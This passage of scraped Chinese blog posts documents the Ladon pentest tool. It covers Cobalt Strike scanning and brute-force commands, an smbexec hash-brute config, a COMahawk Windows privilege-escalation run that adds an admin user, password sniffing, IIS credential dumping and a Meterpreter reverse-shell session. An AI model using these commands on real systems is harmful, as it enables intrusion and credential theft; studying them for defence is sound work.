https://github.com/k8gege/Ladon/releases","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Kali","slug":"Kali","permalink":"http://k8gege.org/categories/Kali/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Kali","slug":"Kali","permalink":"http://k8gege.org/tags/Kali/"},{"name":"Scanner","slug":"Scanner","permalink":"http://k8gege.org/tags/Scanner/"}]},{"title":"Ladon For Cobalt Strike 4.0","slug":"Ladon for cs4.0","date":"2020-03-29T16:11:00.000Z","updated":"2020-06-04T12:32:02.897Z","comments":true,"path":"p/c5430395.html","link":"","permalink":"http://k8gege.org/p/c5430395.html","excerpt":"","text":"前言Ladon 6.2支持Cobalt Strike 4.0,内置58个功能加载脚本Ladon.cna,通过Beacon命令或右键使用 应用场景CS命令行下扫描目标内网,无需代理转发扫描收集信息、密码爆破等跳板扫描外网资产(即无需代理直接通过在控机器扫描其它目标资产) Ladon右键菜单相比Beacon命令行，GUI就更简单了，只需填写IP、URL等，一键扫描 主菜单资产扫描漏洞检测密码爆破网络嗅探信息收集 例子：WmiHash密码爆破 Beacon命令帮助Example: Ladon help 1.MS17010 MS17-010漏洞扫描Example: Ladon 192.168.1.8/24 MS17010结果:IP、SMB漏洞、机器名、操作系统版本 2.OSscan 操作系统探测Example: Ladon 192.168.1.8/24 OSscan通过SMB、多端口、Banner等方式探测（存活主机、主机名、域名、操作系统版本、开放服务等） 3.OnlinePC 存活主机扫描Example: Ladon 192.168.1.8/24 OnlinePC也支持检测主机名/域名是否存活,结果IP、Mac、机器名 4.WebScan Web扫描Example: Ladon 192.168.1.8/24 WebScan内网站点扫描，获取服务器Banner、网页标题 5.FtpScan FTP密码扫描Example: Ladon 192.168.1.8/24 FtpScan需上传user.txt和pass.txt至beacon工作目录 6.WmiScan Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）Example: Ladon 192.168.1.8/24 WmiScanWmi方式批量爆破内网主机帐密,需上传user.txt和pass.txt至工作目录 7.CiscoScan 思科设备扫描Example: Ladon 192.168.1.8/24 CiscoScan(IP、设备型号、主机名、Boot、硬件版本) 8.UrlScan C段域名URL扫描Example: Ladon 192.168.1.8/24 UrlScan通过源码获取域名或URL，但不验证IP,适用于内网扫描时，目标域名指向外网IP或者通过域名判断内网站点是何产品，比如出现cisco.com域名，说明此为cisco设备 9.SameWeb C段旁站扫描Example: Ladon 192.168.1.8/24 SameWeb通过源码获取域名并验证IP，返回正确的同服站点,非bing或爱站等方式,即内网不可上网也可扫描验证IP主要适用于，外网扫描时旁站，因为获取的域名指向外网时，无法通过IP判断是否属于同服 10.WeblogicExp &amp; WeblogicPocExample: Ladon 192.168.1.8/24 WeblogicPocExample: Ladon 192.168.1.8/24 WeblogicExpWeblogic漏洞扫描两个模块,一个是只扫描是否存在漏洞，另一个是扫描并且GetShell 11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机Example: Ladon 192.168.1.8/24 EnumMSSQL和PowerUpSql一样不一定能获取到SQL版本 12.EnumShare 枚举局域网共享资源Example: Ladon 192.168.1.8/24 EnumShare 13.MssqlScan MSSQL数据库密码爆破Example: Ladon 192.168.1.8/24 MssqlScan 14.MysqlScan MySQL数据库密码爆破Example: Ladon 192.168.1.8/24 MysqlScan 15.SSHscan SSH主机密码爆破Example: Ladon 192.168.1.8/24 SSHscan 16.OracleScan Oracle数据库密码爆破Example: Ladon 192.168.1.8/24 OracleScan 17.HostIP 域名解析/主机名转IPExample: Ladon 192.168.1.8/24 HostIP 18.WhatCMS Web指纹识别支持75种Example: Ladon 192.168.1.8/24 WhatCMSurl.txt指定站点或批量站点扫描,也可扫描整个C段部分web端口对应CMS 19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)Example: Ladon 192.168.1.8/24 IpcScan 21.EnBase64/DeBase64 Base64密码批量加密解密Example: Ladon 明文字符串 EnBase64Example: Ladon Base64内容 DeBase64 22.EnHex/DeHex Hex密码批量加密解密(3种格式)Example: Ladon 明文字符串 EnHexExample: Ladon 16进制内容 EnHex 23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)Example: Ladon 192.168.1.8/24 SmbScan 24.PhpStudyPoc PhpStudy后门检测Example: Ladon 192.168.1.8/24 PhpStudyPoc 25.DomainIP 域名解析Example: Ladon youdomain DomainIP 26.SubDomain 子域名爆破Example: Ladon 192.168.1.8/24 SubDomain需域名字典SubDomain.dic例子: Ladon baidu.com SubDomain 27.WebDir Web目录扫描Example: Ladon http://youweb.com WebDir 28.ActiveMQPoc ActiveMQ漏洞扫描Example: Ladon 192.168.1.8/24 ActiveMQPoc 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases","categories":[{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/categories/CS/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/tags/CS/"}]},{"title":"Ladon 6.2自定义密码爆破","slug":"Ladon Diy Brute-Force","date":"2020-03-29T16:10:00.000Z","updated":"2020-06-06T02:32:58.214Z","comments":true,"path":"p/53177.html","link":"","permalink":"http://k8gege.org/p/53177.html","excerpt":"","text":"前言内置密码爆破模块还不够全面，研发其它协议认证需要时间。先不说功能实现，首先搭建各种协议认证环境就不少时间吧。还有别人的工具不开源的情况，而且它只能支持单个IP爆破。这时候我们需要批量爆破整个C段、多个网段、或批量列表。批量包括但不限于IP、URL、机器名、CIDR格式、任意XX等。 INI配置插件适用场景，需调用相关命令或第三方工具进行批量操作或者有新的POC，但来不及或无法写成DLL来调用时很多第3方工具不支持批量或者说根本不支持批量网段而Ladon不只限于批量IP、URL、IP段、任意内容等是紧急情况下最适合用于验证内网是否存在漏洞工具新的漏洞来时你能调好POC就不错了，批量更要时间 自定义密码爆破例子：调用修改过的smbexec.exe进行HASH密码验证，原版不退出无法爆破根目录下放4个文件，smbexec.exe、smbhash.ini、user.txt、pass.txt。 smbhash.ini 123456[Ladon]exe=smbexec.exearg=-hashes $pass$ $user$@$ip$isok=Launching semi-interactive shellport=445log=true INI插件用法命令：Ladon 192.168.1.1/24 smbhash.ini INI参数说明exe: 程序名称，必填项。不指定路径优先加载SYSTEM32目录或当前目录下程序arg: 程序参数，必填项。其中$ip$、$user$、$pass$变量为字典文件替换变量isok：成功标志，必填项。如smbexec成功时返回”Launching semi-interactive shell”port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破log: 程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示 检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini截图为6.1，大家记得把ret改成isok就行了。 功能多余？有人可能会说，功能用不到，批量用自己的程序就可以了。1.不是所有人都会编程，INI配置的目的主要是给这些人用的。2.据我所知市面上的批量，仅支持批量单一列表，如IP列表、URL列表等，且不支持模块化。 举个例子：CVE-2019-0708原版漏洞检测批量支持C段扫描，但不支持批量C段甚至批量B段扫描。没错它是开源的，但有几个人去实现修改让它支持更多实战环境的批量需求？C语言的多线程操作可和Python这种小学生都能轻松学会的人随便写的啊。如果别的Poc，用其它你不懂的语言来写，你需要急用，你还会慢慢去学？当然你不觉得麻烦，也可以另外用自己会的语言写个批量调用工具，哈哈 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"密码爆破","slug":"Brute-Force","permalink":"http://k8gege.org/categories/Brute-Force/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Brute","slug":"Brute","permalink":"http://k8gege.org/tags/Brute/"}]},{"title":"利用SqlDataSourceEnumerator获取局域网SQL主机","slug":"PowerShell found SqlServer","date":"2020-03-28T03:39:45.695Z","updated":"2020-06-11T16:37:30.738Z","comments":true,"path":"p/61471.html","link":"","permalink":"http://k8gege.org/p/61471.html","excerpt":"","text":"前言SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程序开发人员公开此信息，提供包含所有可见服务器的信息的 DataTable。 此返回的表包含网络上可用的服务器实例的列表，该列表与用户尝试创建新连接时提供的列表匹配，并展开包含连接属性上所有可用服务器的下拉列表。对话框。 显示的结果并非总是完整的。 SqlDataSourceEnumerator命名空间: System.Data.Sql程序集: System.Data.dll 提供了一种枚举本地网络内的所有可用 SQL Server 实例的机制。 通过方法调用返回的表包含以下列，所有列均包含 string 值：列 描述ServerName 服务器的名称。InstanceName 服务器实例的名称。 如果服务器作为默认实例运行，则为空白。IsClustered 指示服务器是否属于群集。Version 服务器的版本。 例如: -9.00 （SQL Server 2005）-10.0. xx （SQL Server 2008）-10.50 （SQL Server 2008 R2）-11.0. xx （SQL Server 2012） C#示例代码.NET与PowerShell谁的兼容性和执行效率更好就不用我说了 123456789101112131415161718192021222324252627282930using System.Data.Sql; class Program &#123; static void Main() &#123; &#x2F;&#x2F; Retrieve the enumerator instance and then the data. SqlDataSourceEnumerator instance &#x3D; SqlDataSourceEnumerator.Instance; System.Data.DataTable table &#x3D; instance.GetDataSources(); &#x2F;&#x2F; Display the contents of the table. DisplayData(table); Console.WriteLine(&quot;Press any key to continue.&quot;); Console.ReadKey(); &#125; private static void DisplayData(System.Data.DataTable table) &#123; foreach (System.Data.DataRow row in table.Rows) &#123; foreach (System.Data.DataColumn col in table.Columns) &#123; Console.WriteLine(&quot;&#123;0&#125; &#x3D; &#123;1&#125;&quot;, col.ColumnName, row[col]); &#125; Console.WriteLine(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;); &#125; &#125; &#125; PowerShell命令系统未安装或禁用PowerShell会失效，但也比国人故意吹捧的PowerUPSQL好很多倍。 123456C:\\Users\\k8gege\\Desktop&gt;PowerShell -Command \"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()\"ServerName InstanceName IsClustered Version---------- ------------ ----------- -------K82003-77562E10WIN-OLDM1T2H9M4 PowerUPSQL此工具也是基于SqlDataSourceEnumerator实现的，兼容性较差，很多系统下运行各种报错。 PS C:\\Users\\k8gege\\Desktop\\PowerUpSQL-master&gt; Get-SQLInstanceBroadcast -Verbose 详细信息: Attempting to identify SQL Server instances on the broadcast domain. 详细信息: 2 SQL Server instances were found. ComputerName Instance IsClustered Version ------------ -------- ----------- ------- K82003-77562E10 K82003-77562E10 WIN-OLDM1T2H9M4 WIN-OLDM1T2H9M4 Ladon EnumMssqlLadon的EnumMssql模块不支持扫描，若内网存在多个网段，可使用PortScan扫描探测。 Ladon与PowerUPSQL对比，Ladon支持任意Win系统，而PowerUPSQL就未必能用了 参考https://github.com/k8gege/Ladonhttps://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server","categories":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"主机发现","slug":"OnlinePC","permalink":"http://k8gege.org/categories/OnlinePC/"},{"name":"信息收集","slug":"Discover","permalink":"http://k8gege.org/categories/Discover/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/tags/Dotnet/"},{"name":"SQL","slug":"SQL","permalink":"http://k8gege.org/tags/SQL/"}]},{"title":"Windows提权工具 CVE-2019-1405 & CVE-2019-1322","slug":"提权CVE-2019-1405 & CVE-2019-1322","date":"2020-03-28T03:39:45.695Z","updated":"2020-01-15T15:25:43.260Z","comments":true,"path":"p/19321.html","link":"","permalink":"http://k8gege.org/p/19321.html","excerpt":"","text":"漏洞介绍由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服务中的一个逻辑错误，可让本地普通用户以LOCAL SERVICE身份执行任意命令。第二个漏洞CVE-2019-1322是一个简单的服务配置错误，可让本地SERVICE组中的任何用户重新配置以SYSTEM权限运行的服务（此漏洞也被其他研究人员发现）。当以上两个漏洞结合在一起时，就允许本地普通用户以SYSTEM权限执行任意命令。 全面检查了一些Windows服务,发现以LOCAL SERVICE或NETWORK SERVICE运行的所有用户都可以执行这种攻击。其中就包括前面我们提到的UPnP Device Host服务,这样我们就能以本地任意用户身份,结合使用CVE-2019-1405及CVE-2019-1322这两个漏洞,成功在Windows 10(1803到1903)系统上将权限提升至SYSTEM用户。 漏洞版本Vendor Product VersionsMicrosoft Windows 10 -, 1607, 1709, 1803, 1809, 1903Microsoft Windows 7 -Microsoft Windows 8.1 -Microsoft Windows Rt 8.1 -Microsoft Windows Server 2008 -, R2Microsoft Windows Server 2012 -, R2Microsoft Windows Server 2016 -, 1803, 1903Microsoft Windows Server 2019 - 默认提权123456789101112C:\\Users\\null\\Desktop&gt;COMahawk64.exe[\\] Progress: 1/9 2/9 3/9 4/9 5/9 6/9 7/9 8/9 9/9[+] Hopefully k8gege:K8gege520 is added as an admin.C:\\Users\\null\\Desktop&gt;net user\\\\DESKTOP-3F42O5D 的用户帐户-------------------------------------------------------------------------------Administrator DefaultAccount Guestk8gege null WDAGUtilityAccount命令成功完成。 指定命令123456789101112C:\\Users\\null\\Desktop&gt;COMahawk64.exe \"net user k8gege K8gege123? /add\"[+] Executing command [ sc config UsoSvc binpath= \"cmd.exe /c net user k8gege K8gege123? /add\" ][\\] Progress: 1/6 2/6 3/6 4/6 5/6 6/6[+] Command executed.C:\\Users\\null\\Desktop&gt;net user\\\\DESKTOP-3F42O5D 的用户帐户-------------------------------------------------------------------------------Administrator DefaultAccount Guestk8gege null WDAGUtilityAccount命令成功完成。 Win10提权Teston Win10 X64 1803 Exphttps://github.com/apt69/COMahawk https://github.com/k8gege/K8tools/raw/master/Comahawk.rar","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"提权","slug":"Lpe","permalink":"http://k8gege.org/categories/Lpe/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"LPE","slug":"LPE","permalink":"http://k8gege.org/tags/LPE/"}]},{"title":"Ladon6.0新增密码嗅探、IIS密码读取、LDAP域密码爆破","slug":"Ladon6.0","date":"2020-03-28T03:39:45.679Z","updated":"2020-06-11T16:27:22.803Z","comments":true,"path":"p/56393.html","link":"","permalink":"http://k8gege.org/p/56393.html","excerpt":"","text":"Ladon6.0新增FTP/HTTP密码嗅探、IIS密码读取、LDAP域密码爆破、进程详细信息获取、渗透相关信息获取、命令行参数信息操作系统识别、Wmi密码爆破、Smb密码爆破等功能优化 更新日志 动作 模块 说明 新增 LdapScan AD域密码爆破:基于Ldap协议爆破Windows密码 新增 FtpSniffer/SnifferFtp Ftp密码嗅探(无需WinPcap) 新增 HttpSniffer/SnifferHTTP HTTP密码嗅探(无需WinPcap) 新增 GetCmdLine/CmdLine 获取进程命令行参数/可指定进程 新增 GetInfo 获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等） 新增 GetInfo2 包含GetInfo &amp; Wmi获取信息 新增 Sniffer 网络嗅探(源地址、目标地址)，可用于发现内网存活主机、恶意木马上线地址 新增 EnumIIS/IisWeb 获取IIS站点、路径、帐号、密码 新增 EnumProcess/ProcessList/tasklist 枚举进程 结果(PID、Session、位数、进程名、用户名、路径、标题) 更新 HttpDownload/wget HTTP下载命令简化也可使用wget 更新 OsScan 扫描速度优化(某项目批量C段不再卡死) 更新 WmiScan 135端口关闭或RPC不可用停止爆破 更新 SmbScan 445端口关闭停止爆破(功能完美代替IpcScan，只是需使用DLL) 移除 IPCScan 速度慢以及批量可能存在误报将其移除，反正SmbScan完全替代 更新 所有模块 所有功能模块参数忽略大小写 LdapScan AD域服务器密码爆破非域内机器也可破解跨网段AD域服务器，LDAP端口为389注意非3389，即便跑出来的密码能登远程桌面也没半毛钱关系还有WMI、SMB(IPC)跑出来的密码也一样，3389是RDP协议WMI端口135，SMB端口445，不要以为能登3389一定能IPC连接有时一个帐密各种协议方法都能连到远程机器只能说运气好不要说这个密码3389可以登，但是WMI或SMB跑不出来，瞎搞默认条件下都不能保证100%，更何况经过配置或出问题的系统 FtpSniffer FTP密码嗅探支持两种写法: FtpSniffer/SnifferFtpExample: Ladon FtpSniffer 192.168.1.8(本机某个IP相当于指定网卡) HttpSniffer HTTP密码嗅探支持两种写法: HttpSniffer/SnifferHTTPExample: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡) Sniffer 网络嗅探基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码后续可能会添加其它功能可能另外写个专门用于嗅探的工具 PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到) Example: Ladon HttpSniffer 192.168.1.8(本机某个IP相当于指定网卡) EnumIIS IIS站点密码读取获取IIS站点、路径、帐号、密码 EnumProcess 进程详细信息获取支持三种写法: EnumProcess/ProcessList/tasklist结果(PID、Session、位数、进程名、用户名、路径、标题) GetCmdLine 进程启动参数进程启动参数/可指定进程支持2种写法: GetCmdLine/CmdLine GetInfo 获取渗透基础信息获取渗透基础信息（IP、域信息、系统信息、软件信息、网络连接、补丁信息、用户等）GetInfo2 包含GetInfo &amp; Wmi获取的相关信息 全部功能http://k8gege.org/p/648af4b3.html 下载https://github.com/k8gege/Ladon","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"密码","slug":"Pass","permalink":"http://k8gege.org/categories/Pass/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"嗅探","slug":"Sniffer","permalink":"http://k8gege.org/categories/Sniffer/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Sniffer","slug":"Sniffer","permalink":"http://k8gege.org/tags/Sniffer/"},{"name":"FtpSniffer","slug":"FtpSniffer","permalink":"http://k8gege.org/tags/FtpSniffer/"},{"name":"HttpSniffer","slug":"HttpSniffer","permalink":"http://k8gege.org/tags/HttpSniffer/"},{"name":"IIS","slug":"IIS","permalink":"http://k8gege.org/tags/IIS/"},{"name":"LDAP","slug":"LDAP","permalink":"http://k8gege.org/tags/LDAP/"}]},{"title":"Metasploit/PowerShell内存加载执行.NET","slug":"MSF & .NET & PowerShell","date":"2020-03-28T03:39:45.679Z","updated":"2020-01-10T15:32:19.936Z","comments":true,"path":"p/57438.html","link":"","permalink":"http://k8gege.org/p/57438.html","excerpt":"","text":"前言随着XP和2003退出Windows系统，.NET与PowerShell在渗透中将会更吃香，虽然.NET和PowerShell可以相互调用但PowerShell的兼容性远不如.NET，且想要执行PowerShell，前提也需要.net环境，效率方面也是程序比脚本强同样都可内存加载，为何非要鼓吹PowerShell呢，很多PowerShell框架或模块，兼容性和稳定性并不好都没人说，好了不扯太远，下面我们来看一下如何使用MSF中Meterpreter的powershell模块在内存中执行.NET程序集。 0x001 C# DLL123456789101112131415using System;using System.Collections.Generic;using System.Linq;using System.Text;namespace msftest&#123; public class msf &#123; public static string run() &#123; return &quot;msftest by k8gege&quot;; &#125; &#125;&#125; 0x002 PowerShell首先我们先通过系统自带PowerShell执行DLL，看DLL功能是否正常。 123456789PS C:\\Users\\k8gege\\&gt; [Reflection.Assembly]::LoadFile(\"C:\\Users\\k8gege\\msftest.dll\")GAC Version Location--- ------- --------False v2.0.50727 C:\\Users\\k8gege\\\\msftest.dllPS C:\\Users\\k8gege\\&gt; [msftest.msf]::run()msftest by k8gege 0x003 MSF加载.NET将DLL复制至MSF服务器,使用Meterpreter的powershell模块在内存中执行DLL 12345678910111213msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 0.0.0.0:443 [*] Sending stage (180291 bytes) to 192.168.1.5[*] Meterpreter session 3 opened (192.168.1.61:443 -&gt; 192.168.1.5:54647) at 2019-12-19 20:36:14 -0500meterpreter &gt; load powershellLoading extension powershell...Success.meterpreter &gt; powershell_import msftest.dll[+] File successfully imported. No result was returned.meterpreter &gt; powershell_execute \"[msftest.msf]::run()\"[+] Command execution completed:msftest by k8gege 0x004 关于兼容性1.MSF中的powershell模块稳定性和兼容性并不好，K8在两台WIN7中测试有一台刚加载powershell模块，MET就崩溃导致权限丢失（而且还弹框）再者某些程序集和PowerShell脚本也不能正常加载，有些功能也会失效。这一点Cobalt Strike做得比较好，对.net和PowerShell兼容性80%吧，.NET加载功能好比虚拟机加载操作系统，CS无法执行部分.NET函数很正常正如Ladon在CS下执行，部分功能直接不可用，部分功能执行还有问题。有些人可能说是Ladon的问题，当然说得也没错，但没想过CS的问题吗它提供.NET程序执行的功能,只是使用了几个微软API接口，并不完全试想一下被微软收购做了10几年.NET跨平台的MONO也不能保证100%兼容CS确实是非常强大我承认(不然不使用)，但强大并不等于它就没有问题它的缺点和优点一样，非常多，你用久了懂在理懂的功能多了就会发现MONO那么大都不能保证完全兼容.NET，CS区区几行代码能完全兼容吗? 我上面说的Ladon在CS下有问题，说Ladon也有问题没错，是因为我认为写一个好的渗透工具，应尽量兼容各种环境。不过CS也只是使用的工具，还不是目标环境，要是连工具自身有BUG的模块都能完全兼容，就是完美。 目前Ladon有几个模块不兼容CS，在CNA脚本里有注明，用前必看。其它模块可能在CS下使用远不如EXE好用，特别是那些没把时间改成3秒内的，默认60秒才有回显，说成是Ladon扫描慢(即便改成0秒也慢)，因为CS无法完美快速回显。看看CS自带的简单端口扫描或其它扫描，光扫几台机器，CS的回显就很慢吧。何况Ladon还是外置插件，如Ladon扫描百度子域名很快，但在CS下回显很慢，并不是Ladon扫得慢，好比把水管前面接一根吸管，要装满一桶水，能快吗。Ladon扫描很快如同水管，但CS回显如同吸管，水管里的水再快也会因吸管变慢。 2.powershell模块也支持EXE程序，但需要把.exe改成.dll后缀才能加载。因为通过powershell加载，如果通过系统本身的PowerShell加载都不正常，MSF加载也会失败，因为MSF并不是虚拟一个.NET加载功能。 如下所示，有时通过系统PowerShell加载ex一样报错PS C:\\Users\\k8gege&gt; [Reflection.Assembly]::LoadFile(“C:\\Users\\k8gege\\test.exe”)使用“1”个参数调用“LoadFile”时发生异常:“生成此程序集的运行时比当前加载的运行时新,无法加载此程序集。 (异常来自 HRESULT:0x8013101B)”所在位置 行:1 字符: 32 [Reflection.Assembly]::LoadFile &lt;&lt;&lt;&lt; (“C:\\Users\\k8gege\\test.exe”) CategoryInfo : NotSpecified: (:) [], MethodInvocationException FullyQualifiedErrorId : DotNetMethodException 0x005 结论虽然本文介绍了通过MSF加载执行.NET程序的方法，但是从兼容性以及稳定性来看目前在实战中还是慎用为好，以免因为弹框或崩溃导致权限丢失。不能因为MSF强大而无脑使用它的所有功能，程序强大并不代表所有功能模块都稳定好用。只需要使用稳定好用的模块功能即可，其它模块可以等作者更新稳定后再使用。 注意：我这里说的是不推荐用MSF中的PowerShell加载模块，并不是说MSF。如同说霍金身体残废，但却没有说他是废人哦，何况只是说他一只手受伤。","categories":[{"name":"Metasploit","slug":"Metasploit","permalink":"http://k8gege.org/categories/Metasploit/"},{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/categories/Dotnet/"},{"name":"PowerShell","slug":"PowerShell","permalink":"http://k8gege.org/categories/PowerShell/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"http://k8gege.org/tags/Metasploit/"},{"name":"PowerShell","slug":"PowerShell","permalink":"http://k8gege.org/tags/PowerShell/"},{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/tags/Dotnet/"},{"name":"C#","slug":"C","permalink":"http://k8gege.org/tags/C/"},{"name":"MSF","slug":"MSF","permalink":"http://k8gege.org/tags/MSF/"},{"name":"meterpreter","slug":"meterpreter","permalink":"http://k8gege.org/tags/meterpreter/"}]},{"title":"看我如何模拟Cobalt Strike上线欺骗入侵者","slug":"Ladon CS cheat","date":"2020-03-28T03:39:45.663Z","updated":"2020-03-30T03:06:09.182Z","comments":true,"path":"p/40523.html","link":"","permalink":"http://k8gege.org/p/40523.html","excerpt":"","text":"前言不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题但是人为的你可能没遇到过，首先要欺骗你的远控，得分析你的协议，如果你的马根本不是公开的网络又是好的，你刚往人家机器里种马，发现马只能上线不能操作，绝对是马有问题，不能甩锅我人家都不知道你的马的通信原理，流量特征，不可能事先准备好一个程序，让你一发就欺骗你的马本文主要研究CS这个APT很喜欢用的马，当然TCP的也一样原理，只要构造对应的数据包就可欺骗 远控术语Cobalt Strike采用的是B/S架构，也就是常说的HTTP协议（HTTPS加密的http，记住都是WEB就不会错了）Client：客户是上帝，我们想买什么告诉服务员。就是控制端，即通过它来控制对方电脑。不叫服务端哦Server：服务员，即服务端。以前常说的肉鸡，这个叫被控端不是控制端，叫做什么就做什么不就是服务？中转：放在VPS，好比现在的快递，可有可无，买家直接见卖家就不需要。CS中转Teamserve就是一个WEB 就是说如果你用IIS或Tomcat搭建的ASP、JSP、PHP、.NET等网站也可以做为中转，即可实现HTTP远控如果CS不搞客户端，我们便可直接在浏览器上操作和控制目标机器，这就是08年这类码称为B/S架构的原因CS的客户端就像我们用PY或其它语言实现模拟WEB登陆网站来操作一样，中转是WEB，那么肉鸡上线，它也一样是HTTP请求来实现，WEB发包、POST提交不管怎么表达都可以，这是渗透基础，即是CS通信采用HTTP C/S架构：Clinet/Server,主要指的是TCP，客户端和服务端，即便带个中转它也还是叫CS架构B/S架构: Browser/Server,主要是HTTP，无论直接通过浏览器操作，还是像CS加个中转再用客户端访问RAT：Remote Admin Tools，远程管理工具，长期以来国内外通用叫法。C2: 老外的新名词，command&amp;control，从字面上就很好理解命令和控制，不管任何协议马都可这样叫这种叫法对于不够专业的人来说不会错，因为他根本不需要了解远控到底用什么协议实现，反正都叫C2 当然无论是以前还是现在叫RAT也绝对不会错，叫RAT可能更专业一点，RAT像老戏骨，C2像小鲜肉看看现在好多远控基本都有CMD和文件管理，甚至只是一个SHELL而已了，我猜这就是C2的由来吧以前像这样一般只称为后门，随便找一个远控都有CMD、文件管理、屏幕控制、键盘记录等功能而现在一个CMD和文件管理，在10几年前也很难称为马叫炮灰，现在搞个炮灰一堆BUG还以为很吊以前只能称为后门，连远控都称不上的，现在只实现了一个CMD执行命令，就说成自己写个远控了多台机器管理实现不了先不说，只能一对一，断以后就无法控制，连后门都不合格，还TM说成远控 PS：之所以写这一段话，主要是发现不少写马的或渗透的，竟然都分不清楚服务端和控制端 HTTP协议还有我说HTTP协议(含HTTP/S)，还有人说不是HTTP还有HTTPS（首先搞清楚HTTPS是什么，加密的HTTP）比方说你设计一个HTTP经过特定格式加密，单纯HTTP访问得不到真实数据而已，解不了就不属于HTTP了？当有一天大家都觉得这个加密好用或安全，给它起个名叫KTTPS，或许可称为新协议，但本质还是HTTP协议。当然可能有些人要说HTTP也属于TCP，虽说HTTP可通过TCP实现，但是两者有很大区别，通过TCP实现叫伪为什么因为它不是真正的HTTP，目标WAF禁TCP的时候，TCP实现的就出不来，HTTP只要会操作WEB就行HTTP比TCP多了一个，允许通过WEB操作来访问，HTTP虽是特殊的TCP，但已经完全变异成了一个新协议。 就像猩猩和人，我们几乎不会说人是猩猩，只会说人是猩猩进化而来的，因为变异太多，可以以新物种定义。而HTTPS和HTTP，就像戴不戴口罩，戴个口罩就TM不是人了？除了戴个口罩，你的衣食住行哪一样不是人。你不戴口罩进不了小区，那你就戴口罩就能进去了啊，就像HTTPS(HTTP基础上加SSL协议就可以访问了啊)HTTP不加SSL访问不了HTTPS，你就说HTTPS不属于HTTP，这和不戴口罩不让进小区，就说你不是人一样本质是因为你不是人而不让你进吗？而是你不戴口罩，并不是说你不是人所以不让你出入，概念不一样。所以说我们通常只说TCP协议、HTTP协议(因为已包含HTTPS在内)，至少10几年来很少听到有人说HTTPS马最多只是听说这款http马也支持https，或这个webshell工具支持https站点，这个EXP支持HTTPS站点等 CS心跳包一般在设计远控时，我们都会对机器进行标记，比如上线特征为AA对应信息已保存在本地数据库，因此想要确认机器是否还在控我们只需要发送A标识给客户端，告诉它机器还在控制,即心跳包而没实战过的人是每次都发送目标信息，这样很容易被目标发现 下面配置好CS让其上线后，我们对服务端进行抓包，其心跳包如下CS也是一样，因为是BS模式HTTP协议，它的心跳特征存在Cookie里非正常cookie写法，一段很长的加密数据，可以止来判断是否中招 上线验证使用Ladon Exp生成器可以提交WEB数据包，类似Firefox上的HackBar但更高级区别在于可生成Ladon插件或独立EXE，对于不懂编程的人来说也可“编写”EXP 运行LadonPoc.exe发现CS上线，执行一次就上线一次，说明思路没错 